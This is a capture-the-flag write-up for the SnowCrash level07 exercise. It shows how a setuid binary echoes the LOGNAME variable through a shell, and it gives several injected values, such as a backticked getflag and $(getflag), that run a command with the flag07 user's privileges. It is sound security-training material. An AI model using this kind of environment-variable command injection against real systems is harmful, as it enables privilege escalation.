# level07
We are given a file called level07 to work with

![image](https://github.com/user-attachments/assets/62846dbd-88db-4111-a206-e910c3e3e917)

I tried to cat this file and crashed my computer. Don't do that. It is a binary afterall.

![image](https://github.com/user-attachments/assets/a6eaaed6-d583-4e70-bc4f-232e6808b74f)

We take a look at the permissions and see the potential for exploit.

![image](https://github.com/user-attachments/assets/29a3c37a-fa3e-4b7a-acca-3b0bcfcb157e)

Let's try running it:

![image](https://github.com/user-attachments/assets/24c2a827-052b-493a-8c8a-721207468a03)

Weird, does it do nothing else? We can inspect further with some of the commands we have used in the previous exercises.

`level07@SnowCrash:~$ strings level07`

![image](https://github.com/user-attachments/assets/e030042e-87bb-4134-bc9b-0dd83f91f16c)

So it simply echoes the enivorment variable LOGNAME's value.

_The logname command displays the login name of the current process. This is the name that the user logged in with and corresponds to the LOGNAME variable in the system-state environment. This variable is only set when the user logs into the system._

We can confirm with `level07@SnowCrash:~$ printenv LOGNAME`

![image](https://github.com/user-attachments/assets/1f43e154-4402-4ef1-ae0d-1fa41a848726)

We can change the value in a way that can make level07 run getflag. And get the token thanks to the priviliges of flag07 user.

The solution seems straightforward
```
level07@SnowCrash:~$ export LOGNAME=`getflag`
```

![image](https://github.com/user-attachments/assets/a31fc635-9451-4d0d-90fb-4edea50881a8)

But this makes getflag run prematurely and assigns the resulting message to LOGNAME.
We have dealt with similar situations before and found many workarounds. This time will be similar.

We can get the help of the trusty single quote
```
level07@SnowCrash:~$ export LOGNAME='`getflag`'
````

![image](https://github.com/user-attachments/assets/b1dc62af-d615-4299-b937-cc88c745b11c)

Or use backslash which is an escape character in shell. It preserves the literal value of the next character. (Except in cases like newline character and so on [see](https://stackoverflow.com/questions/65001228/why-putting-the-backslash-character-between-characters-in-commands-still-w))

```
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
```

![image](https://github.com/user-attachments/assets/0acdda98-73eb-4cc5-a61a-53099d7b2378)

Of course, `level07@SnowCrash:~$ export LOGNAME='$(getflag)'` works too

![image](https://github.com/user-attachments/assets/6f813e76-73d8-4d0f-9574-c898914d9070)

👍
